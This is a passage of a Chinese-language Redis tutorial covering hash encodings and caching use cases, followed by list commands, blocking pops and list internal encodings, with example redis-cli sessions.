<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; hstrlen user:1 name</span><br><span class="line">(<span class="built_in">integer</span>) 3</span><br></pre></td></tr></table></figure>

<p>下面是 哈希类型命令 的 时间复杂度，开发人员可以参考此表选择适合的命令。</p>
<figure class="image-box">
                <img src="1663a75da490cbc5.png" alt title class>
                <p></p>
            </figure>
<figure class="image-box">
                <img src="1663a75da4be1ea2.png" alt title class>
                <p></p>
            </figure>

<h3 id="内部编码-1"><a href="#内部编码-1" class="headerlink" title="内部编码"></a>内部编码</h3><p>哈希类型 的 内部编码 有两种：</p>
<h4 id="1、ziplist（压缩列表）"><a href="#1、ziplist（压缩列表）" class="headerlink" title="1、ziplist（压缩列表）"></a>1、ziplist（压缩列表）</h4><p>当 哈希类型 元素个数 小于 <code>hash-max-ziplist-entries</code> 配置（默认 512 个）、同时 所有值 都 小于 <code>hash-max-ziplist-value</code> 配置（默认 64 字节）时，Redis 会使用 <strong>ziplist</strong> 作为 哈希 的 内部实现，ziplist 使用更加 紧凑的结构 实现多个元素的 连续存储，所以在 节省内存 方面比 hashtable 更加优秀。</p>
<h4 id="2、hashtable（哈希表）"><a href="#2、hashtable（哈希表）" class="headerlink" title="2、hashtable（哈希表）"></a>2、hashtable（哈希表）</h4><p>当 哈希类型 无法满足 ziplist 的条件时，Redis 会使用 <strong>hashtable</strong> 作为 哈希 的 内部实现，因为此时 ziplist 的 读写效率 会下降，而 hashtable 的读写 时间复杂度 为 O（1）。  </p>
<h4 id="编码转换"><a href="#编码转换" class="headerlink" title="编码转换"></a>编码转换</h4><p>下面的示例演示了 哈希类型 的 内部编码，以及相应的变化。</p>
<ul>
<li><p>当 <strong>field 个数 比较少，且没有大的 value</strong> 时，内部编码 为 <strong>ziplist</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; hmset hashkey f1 v1 f2 v2</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; object encoding hashkey</span><br><span class="line"><span class="string">"ziplist"</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>当<strong>有 value 大于 64 字节</strong>时，内部编码 会由 ziplist 变为 <strong>hashtable</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; hset hashkey f3 <span class="string">"one string is bigger than 64 byte...忽略..."</span></span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; object encoding hashkey</span><br><span class="line"><span class="string">"hashtable"</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>当 <strong>field 个数 超过 512</strong>，内部编码 也会由 ziplist 变为 <strong>hashtable</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; hmset hashkey f1 v1 f2 v2 f3 v3 ... f513 v513</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; object encoding hashkey</span><br><span class="line"><span class="string">"hashtable"</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="适用场景"><a href="#适用场景" class="headerlink" title="适用场景"></a>适用场景</h3><p>如图所示，为 关系型数据表 的两条 用户信息，用户的属性作为表的列，每条用户信息作为行。</p>
<figure class="image-box">
                <img src="1663e2bcbd27d5c7.png" alt title class>
                <p></p>
            </figure>

<p>使用 Redis 哈希结构 存储 用户信息 的示意图如下：</p>
<figure class="image-box">
                <img src="1663e2bcbd4721e6.png" alt title class>
                <p></p>
            </figure>

<p>相比于使用 字符串序列化 缓存 用户信息，哈希类型 变得更加 直观，并且在 更新操作 上会 更加便捷。可以将每个用户的 id 定义为 键后缀，多对 field-value 对应每个用户的 属性，类似如下伪代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> UserInfo <span class="title">getUserInfo</span><span class="params">(<span class="keyword">long</span> id)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 用户id作为key后缀</span></span><br><span class="line">    String userRedisKey = <span class="string">"user:info:"</span> + id;</span><br><span class="line">    <span class="comment">// 使用hgetall获取所有用户信息映射关系</span></span><br><span class="line">    Object userInfoMap = redis.hgetAll(userRedisKey);</span><br><span class="line">    UserInfo userInfo;</span><br><span class="line">    <span class="keyword">if</span> (userInfoMap != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 将映射关系转换为UserInfo</span></span><br><span class="line">        userInfo = transferMapToUserInfo(userInfoMap);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 从MySQL中获取用户信息</span></span><br><span class="line">        userInfo = mysql.get(id);</span><br><span class="line">        <span class="comment">// 将userInfo变为映射关系使用hmset保存到Redis中</span></span><br><span class="line">        redis.hmset(userRedisKey, transferUserInfoToMap(userInfo));</span><br><span class="line">        <span class="comment">// 添加过期时间</span></span><br><span class="line">        redis.expire(userRedisKey, <span class="number">3600</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> userInfo;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="哈希结构与关系型表"><a href="#哈希结构与关系型表" class="headerlink" title="哈希结构与关系型表"></a>哈希结构与关系型表</h4><p>需要注意的是 哈希类型 和 关系型数据库 有两点不同之处：</p>
<ul>
<li><p>哈希类型 是 稀疏的，而 关系型数据库 是 完全结构化的，例如 哈希类型 每个 键 可以有不同的 field，而 关系型数据库 一旦添加新的 列，所有行 都要为其 设置值（即使为 NULL），如图所示：</p>
<figure class="image-box">
                <img src="1663e2bcbd36e4ce.png" alt title class>
                <p></p>
            </figure>
</li>
<li><p>关系型数据库 可以做复杂的 关系查询，而使用 Redis 去模拟关系型复杂查询 开发困难，维护成本高。</p>
</li>
</ul>
<h4 id="几种缓存方式"><a href="#几种缓存方式" class="headerlink" title="几种缓存方式"></a>几种缓存方式</h4><p>到目前为止，我们已经能够用 三种方法 缓存 用户信息，下面给出三种方案的 实现方法 和 优缺点分析。</p>
<h5 id="1、原生字符串类型"><a href="#1、原生字符串类型" class="headerlink" title="1、原生字符串类型"></a>1、原生字符串类型</h5><p>给用户信息的每一个属性分配 一个键。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> user:1:name tom</span><br><span class="line"><span class="built_in">set</span> user:1:age 23</span><br><span class="line"><span class="built_in">set</span> user:1:city beijing</span><br></pre></td></tr></table></figure>

<ul>
<li>优点：简单直观，每个属性都支持 更新操作。</li>
<li>缺点：占用 过多的键，内存占用量 较大，同时用户信息 内聚性比较差，所以此种方案一般不会在生产环境使用。</li>
</ul>
<h5 id="2、序列化字符串类型"><a href="#2、序列化字符串类型" class="headerlink" title="2、序列化字符串类型"></a>2、序列化字符串类型</h5><p>将用户信息 序列化 后用 一个键 保存。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> user:1 serialize(userInfo)</span><br></pre></td></tr></table></figure>

<ul>
<li>优点：简化编程，如果合理的使用 序列化 可以 提高内存利用率。</li>
<li>缺点：序列化 和 反序列化 有一定的开销，同时每次 更新属性 都需要把 全部数据 取出进行 反序列化，更新后 再 序列化 到 Redis 中。</li>
</ul>
<h5 id="3、哈希类型"><a href="#3、哈希类型" class="headerlink" title="3、哈希类型"></a>3、哈希类型</h5><p>每个用户属性使用 一对 field-value，但是只用 一个键 保存。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hmset user:1 name tom age 23 city beijing</span><br></pre></td></tr></table></figure>

<ul>
<li>优点：简单直观，如果使用合理可以 减少内存空间 的使用。</li>
<li>缺点：要控制和减少 哈希 在 ziplist 和 hashtable 两种 内部编码 的 转换，hashtable 会消耗 更多内存。</li>
</ul>
<h2 id="小结-5"><a href="#小结-5" class="headerlink" title="小结"></a>小结</h2><p>本文介绍了 Redis 中的 哈希结构 的 一些 基本命令、内部编码 和 适用场景。最后对比了 关系型表 和 哈希结构 的区别，以及几种 存储方式 的优缺点。</p>
<hr>
<h1 id="数据结构之列表"><a href="#数据结构之列表" class="headerlink" title="数据结构之列表"></a>数据结构之列表</h1><h2 id="前言-6"><a href="#前言-6" class="headerlink" title="前言"></a>前言</h2><p>列表（list）类型是用来存储多个 有序 的 字符串。在 Redis 中，可以对列表的 两端 进行 插入（push）和 弹出（pop）操作，还可以获取 指定范围 的 元素列表、获取 指定索引下标 的 元素 等。  </p>
<p>列表 是一种比较 灵活 的 数据结构，它可以充当 栈 和 队列 的角色，在实际开发上有很多应用场景。  </p>
<p>如图所示，a、b、c、d、e 五个元素 从左到右 组成了一个 有序的列表，列表中的每个字符串称为 元素（element），一个列表最多可以存储 <code>2 ^ 32 - 1</code> 个元素。</p>
<ul>
<li><p>列表的 插入 和 弹出 操作</p>
<figure class="image-box">
                <img src="16691de826176b2f.png" alt title class>
                <p></p>
            </figure>
</li>
<li><p>列表的 获取、截取 和 删除 操作</p>
<figure class="image-box">
                <img src="16691de822023ce6.png" alt title class>
                <p></p>
            </figure>

</li>
</ul>
<h2 id="正文-6"><a href="#正文-6" class="headerlink" title="正文"></a>正文</h2><h3 id="相关命令-2"><a href="#相关命令-2" class="headerlink" title="相关命令"></a>相关命令</h3><p>下面将按照对 列表 的 5 种 操作类型 对命令进行介绍：</p>
<figure class="image-box">
                <img src="16691de832ed29e7.png" alt title class>
                <p></p>
            </figure>

<h4 id="添加命令"><a href="#添加命令" class="headerlink" title="添加命令"></a>添加命令</h4><h5 id="从右边插入元素"><a href="#从右边插入元素" class="headerlink" title="从右边插入元素"></a>从右边插入元素</h5><blockquote>
<p><code>rpush key value [value ...]</code></p>
</blockquote>
<p>下面代码 从右向左 插入元素 c、b、a：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; rpush listkey c b a</span><br><span class="line">(<span class="built_in">integer</span>) 3</span><br></pre></td></tr></table></figure>

<p><code>lrange 0 -1</code> 命令可以 从左到右 获取列表的 所有元素：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; lrange listkey 0 -1</span><br><span class="line">1) <span class="string">"c"</span></span><br><span class="line">2) <span class="string">"b"</span></span><br><span class="line">3) <span class="string">"a"</span></span><br></pre></td></tr></table></figure>

<h5 id="从左边插入元素"><a href="#从左边插入元素" class="headerlink" title="从左边插入元素"></a>从左边插入元素</h5><blockquote>
<p><code>lpush key value [value ...]</code></p>
</blockquote>
<p>使用方法和 <code>rpush</code> 相同，只不过从 左侧插入，这里不再赘述。</p>
<h5 id="向某个元素前或者后插入元素"><a href="#向某个元素前或者后插入元素" class="headerlink" title="向某个元素前或者后插入元素"></a>向某个元素前或者后插入元素</h5><blockquote>
<p><code>linsert key before|after pivot value</code></p>
</blockquote>
<p><code>linsert</code> 命令会从 列表 中找到 第一个 等于 pivot 的元素，在其 前（before）或者 后（after）插入一个新的元素 value，例如下面操作会在列表的 元素 b 前插入 redis：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; linsert listkey before b redis</span><br><span class="line">(<span class="built_in">integer</span>) 4</span><br></pre></td></tr></table></figure>

<p>返回结果为 4，代表当前 列表 的 长度，当前列表变为：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; lrange listkey 0 -1</span><br><span class="line">1) <span class="string">"c"</span></span><br><span class="line">2) <span class="string">"redis"</span></span><br><span class="line">3) <span class="string">"b"</span></span><br><span class="line">4) <span class="string">"a"</span></span><br></pre></td></tr></table></figure>

<h4 id="查询命令"><a href="#查询命令" class="headerlink" title="查询命令"></a>查询命令</h4><h5 id="获取指定范围内的元素列表"><a href="#获取指定范围内的元素列表" class="headerlink" title="获取指定范围内的元素列表"></a>获取指定范围内的元素列表</h5><blockquote>
<p><code>lrange key start stop</code></p>
</blockquote>
<p><code>lrange</code> 操作会获取列表 指定索引 范围所有的元素。  </p>
<p>索引下标 有两个特点：</p>
<ul>
<li>其一，索引下标 <strong>从左到右</strong> 分别是 <strong>0</strong> 到 <strong>N-1</strong>，但是 <strong>从右到左</strong> 分别是 <strong>-1</strong> 到 <strong>-N</strong> 。</li>
<li>其二，<code>lrange</code> 中的 <code>end</code> 选项包含了 <strong>自身</strong>，这个和很多编程语言不包含 end 不太相同。</li>
</ul>
<p>从左到右 获取列表的第 2 到第 4 个元素，可以执行如下操作：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; lrange listkey 1 3</span><br><span class="line">1) <span class="string">"redis"</span></span><br><span class="line">2) <span class="string">"b"</span></span><br><span class="line">3) <span class="string">"a"</span></span><br></pre></td></tr></table></figure>

<p>从右到左 获取列表的第 1 到第 3 个元素，可以执行如下操作：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; lrange listkey -3 -1</span><br><span class="line">1) <span class="string">"redis"</span></span><br><span class="line">2) <span class="string">"b"</span></span><br><span class="line">3) <span class="string">"a"</span></span><br></pre></td></tr></table></figure>

<h5 id="获取列表指定索引下标的元素"><a href="#获取列表指定索引下标的元素" class="headerlink" title="获取列表指定索引下标的元素"></a>获取列表指定索引下标的元素</h5><blockquote>
<p><code>lindex key index</code></p>
</blockquote>
<p>例如当前列表 最后一个 元素为 a：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; lindex listkey -1</span><br><span class="line"><span class="string">"a"</span></span><br></pre></td></tr></table></figure>

<h5 id="获取列表长度"><a href="#获取列表长度" class="headerlink" title="获取列表长度"></a>获取列表长度</h5><blockquote>
<p><code>llen key</code></p>
</blockquote>
<p>例如，下面示例 当前列表长度 为 4：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; llen listkey</span><br><span class="line">(<span class="built_in">integer</span>) 4</span><br></pre></td></tr></table></figure>

<h4 id="删除命令"><a href="#删除命令" class="headerlink" title="删除命令"></a>删除命令</h4><h5 id="从列表左侧弹出元素"><a href="#从列表左侧弹出元素" class="headerlink" title="从列表左侧弹出元素"></a>从列表左侧弹出元素</h5><blockquote>
<p><code>lpop key</code></p>
</blockquote>
<p>如下操作将 列表 最左侧的元素 c 弹出，弹出后 列表 变为 redis、b、a。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; lpop listkey</span><br><span class="line"><span class="string">"c"</span></span><br><span class="line">127.0.0.1:6379&gt; lrange listkey 0 -1</span><br><span class="line">1) <span class="string">"redis"</span></span><br><span class="line">2) <span class="string">"b"</span></span><br><span class="line">3) <span class="string">"a"</span></span><br></pre></td></tr></table></figure>

<h5 id="从列表右侧弹出元素"><a href="#从列表右侧弹出元素" class="headerlink" title="从列表右侧弹出元素"></a>从列表右侧弹出元素</h5><blockquote>
<p><code>rpop key</code></p>
</blockquote>
<p>它的使用方法和 <code>lpop</code> 是一样的，只不过从列表 右侧 弹出元元素。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; lpop listkey</span><br><span class="line"><span class="string">"a"</span></span><br><span class="line">127.0.0.1:6379&gt; lrange listkey 0 -1</span><br><span class="line">1) <span class="string">"c"</span></span><br><span class="line">2) <span class="string">"redis"</span></span><br><span class="line">3) <span class="string">"b"</span></span><br></pre></td></tr></table></figure>

<h5 id="删除指定元素"><a href="#删除指定元素" class="headerlink" title="删除指定元素"></a>删除指定元素</h5><blockquote>
<p><code>lrem key count value</code></p>
</blockquote>
<p><code>lrem</code> 命令会从 列表 中找到 等于 value 的元素进行 删除，根据 count 的不同分为三种情况：</p>
<ul>
<li><code>count &gt; 0</code>：从左到右，删除最多 count 个元素。</li>
<li><code>count &lt; 0</code>：从右到左，删除最多 count 绝对值 个元素。</li>
<li><code>count = 0</code>：删除所有。</li>
</ul>
<p>例如向列表 从左向右 插入 5 个 a，那么当前 列表 变为 “a a a a a redis b a”，下面操作将从列表 左边 开始删除 4 个为 a 的元素：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; lrem listkey 4 a</span><br><span class="line">(<span class="built_in">integer</span>) 4</span><br><span class="line">127.0.0.1:6379&gt; lrange listkey 0 -1</span><br><span class="line">1) <span class="string">"a"</span></span><br><span class="line">2) <span class="string">"redis"</span></span><br><span class="line">3) <span class="string">"b"</span></span><br><span class="line">4) <span class="string">"a"</span></span><br></pre></td></tr></table></figure>

<h5 id="按照索引范围修剪列表"><a href="#按照索引范围修剪列表" class="headerlink" title="按照索引范围修剪列表"></a>按照索引范围修剪列表</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; ltrim listkey 1 3</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; lrange listkey 0 -1</span><br><span class="line">1) <span class="string">"redis"</span></span><br><span class="line">2) <span class="string">"b"</span></span><br><span class="line">3) <span class="string">"a"</span></span><br></pre></td></tr></table></figure>

<h4 id="修改命令"><a href="#修改命令" class="headerlink" title="修改命令"></a>修改命令</h4><h5 id="修改指定索引下标的元素"><a href="#修改指定索引下标的元素" class="headerlink" title="修改指定索引下标的元素"></a>修改指定索引下标的元素</h5><p>修改 指定索引下标 的元素：</p>
<blockquote>
<p><code>lset key index newValue</code></p>
</blockquote>
<p>下面操作会将列表 listkey 中的第 3 个元素设置为 mysql：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; lset listkey 2 mysql</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; lrange listkey 0 -1</span><br><span class="line">1) <span class="string">"redis"</span></span><br><span class="line">2) <span class="string">"b"</span></span><br><span class="line">3) <span class="string">"mysql"</span></span><br></pre></td></tr></table></figure>

<h4 id="阻塞操作命令"><a href="#阻塞操作命令" class="headerlink" title="阻塞操作命令"></a>阻塞操作命令</h4><p>阻塞式弹出 操作的命令如下：</p>
<blockquote>
<p><code>blpop key [key ...] timeout</code><br><code>brpop key [key ...] timeout</code></p>
</blockquote>
<p><code>blpop</code> 和 <code>brpop</code> 是 <code>lpop</code> 和 <code>rpop</code> 的 阻塞版本，它们除了 弹出方向 不同，使用方法 基本相同，所以下面以 <code>brpop</code> 命令进行说明， <code>brpop</code> 命令包含两个参数：</p>
<ul>
<li><code>key[key...]</code>：一个列表的 多个键。</li>
<li><code>timeout</code>：阻塞 时间（单位：秒）。</li>
</ul>
<p>对于 <code>timeout</code> 参数，要氛围 列表为空 和 不为空 两种情况：</p>
<ul>
<li>列表为空<br>如果 <code>timeout = 3</code>，那么 客户端 要等到 3 秒后返回，如果 <code>timeout = 0</code>，那么 客户端 一直 <strong>阻塞</strong> 等下去：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; brpop list:<span class="built_in">test</span> 3</span><br><span class="line">(nil)</span><br><span class="line">(3.10s)</span><br><span class="line">127.0.0.1:6379&gt; brpop list:<span class="built_in">test</span> 0</span><br><span class="line">...阻塞...</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>如果此期间添加了数据 element1，客户端 立即返回：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; brpop list:<span class="built_in">test</span> 3</span><br><span class="line">1) <span class="string">"list:test"</span></span><br><span class="line">2) <span class="string">"element1"</span></span><br><span class="line">(2.06s)</span><br></pre></td></tr></table></figure>

<ul>
<li>列表不为空：客户端会 立即返回。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; brpop list:<span class="built_in">test</span> 0</span><br><span class="line">1) <span class="string">"list:test"</span></span><br><span class="line">2) <span class="string">"element1"</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>在使用 <code>brpop</code> 时，有以下两点需要注意：</p>
<ul>
<li>其一，如果是 多个键，那么 <code>brpop</code> 会 从左至右 遍历键，一旦有 一个键 能 弹出元素，客户端 立即返回：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; brpop list:1 list:2 list:3 0</span><br><span class="line">..阻塞..</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>此时另一个 客户端 分别向 list:2 和 list:3 插入元素：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">client-lpush&gt; lpush list:2 element2</span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">client-lpush&gt; lpush list:3 element3</span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br></pre></td></tr></table></figure>

<p>客户端 会立即返回 list:2 中的 element2，因为 list:2 最先有 可以弹出 的元素。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; brpop list:1 list:2 list:3 0</span><br><span class="line">1) <span class="string">"list:2"</span></span><br><span class="line">2) <span class="string">"element2"</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>其二，如果 多个客户端 对 <strong>同一个键</strong> 执行 <code>brpop</code>，那么 <strong>最先</strong>执行 <code>brpop</code> 命令的 客户端 可以 获取 到弹出的值。<br>按先后顺序在 3 个客户端执行 <code>brpop</code> 命令：</p>
<ul>
<li><p>客户端1：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">client-1&gt; brpop list:<span class="built_in">test</span> 0</span><br><span class="line">...阻塞...</span><br></pre></td></tr></table></figure>
</li>
<li><p>客户端2：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">client-2&gt; brpop list:<span class="built_in">test</span> 0</span><br><span class="line">...阻塞...</span><br></pre></td></tr></table></figure>
</li>
<li><p>客户端3：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">client-3&gt; brpop list:<span class="built_in">test</span> 0</span><br><span class="line">...阻塞...</span><br></pre></td></tr></table></figure>

</li>
</ul>
</li>
</ul>
<p>此时另一个 客户端 <code>lpush</code> 一个元素到 list:test 列表中：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">client-lpush&gt; lpush list:<span class="built_in">test</span> element</span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br></pre></td></tr></table></figure>

<p>那么 客户端 1 会获取到元素，因为 客户端 1 最先执行 <code>brpop</code> 命令，而 客户端 2 和 客户端 3 会继续 阻塞。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">client&gt; brpop list:<span class="built_in">test</span> 0</span><br><span class="line">1) <span class="string">"list:test"</span></span><br><span class="line">2) <span class="string">"element"</span></span><br></pre></td></tr></table></figure>

<p>有关 列表 的 基础命令 已经介绍完了，下表是相关命令的 时间复杂度：</p>
<figure class="image-box">
                <img src="16691de83c245b81.png" alt title class>
                <p></p>
            </figure>

<h3 id="内部编码-2"><a href="#内部编码-2" class="headerlink" title="内部编码"></a>内部编码</h3><p>列表类型的 内部编码 有两种：</p>
<h4 id="1、ziplist（压缩列表）-1"><a href="#1、ziplist（压缩列表）-1" class="headerlink" title="1、ziplist（压缩列表）"></a>1、ziplist（压缩列表）</h4><p>当列表的元素个数 小于 <code>list-max-ziplist-entries</code> 配置（默认 512 个），同时列表中 每个元素 的值都 小于 <code>list-max-ziplist-value</code> 配置时（默认 64 字节），Redis 会选用 <strong>ziplist</strong> 来作为 列表 的 内部实现 来减少内存的使用。</p>
<h4 id="2、linkedlist（链表）"><a href="#2、linkedlist（链表）" class="headerlink" title="2、linkedlist（链表）"></a>2、linkedlist（链表）</h4><p>当 列表类型 无法满足 ziplist 的条件时， Redis 会使用 <strong>linkedlist</strong> 作为 列表 的 内部实现。</p>
<h4 id="编码转换-1"><a href="#编码转换-1" class="headerlink" title="编码转换"></a>编码转换</h4><p>下面的示例演示了 列表类型 的 内部编码，以及相应的变化。</p>
<ul>
<li><p>当<strong>元素 个数较少 且 没有大元素</strong> 时，内部编码 为 <strong>ziplist</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; rpush listkey e1 e2 e3</span><br><span class="line">(<span class="built_in">integer</span>) 3</span><br><span class="line">127.0.0.1:6379&gt; object encoding listkey</span><br><span class="line"><span class="string">"ziplist"</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>当<strong>元素个数超过 512 个</strong>，内部编码 变为 <strong>linkedlist</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; rpush listkey e4 e5 ... e512 e513</span><br><span class="line">(<span class="built_in">integer</span>) 513</span><br><span class="line">127.0.0.1:6379&gt; object encoding listkey</span><br><span class="line"><span class="string">"linkedlist"</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>当<strong>某个元素超过 64 字节</strong>，内部编码 也会变为 <strong>linkedlist</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; rpush listkey <span class="string">"one string is bigger than 64 byte..."</span></span><br><span class="line">(<span class="built_in">integer</span>) 4</span><br><span class="line">127.0.0.1:6379&gt; object encoding listkey</span><br><span class="line"><span class="string">"linkedlist"</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>Redis3.2 版本提供了 <strong>quicklist</strong> 内部编码，简单地说它是以一个 ziplist 为 节点 的 linkedlist，它结合了 ziplist 和 linkedlist 两者的优势，为 列表类型 提供了一种更为优秀的 内部编码 实现，它的设计原理可以参考 Redis 的另一个作者 Matt Stancliff 的博客 <a href="https://matt.sh/redis-quicklist" target="_blank" rel="noopener">redis-quicklist</a>。</p>
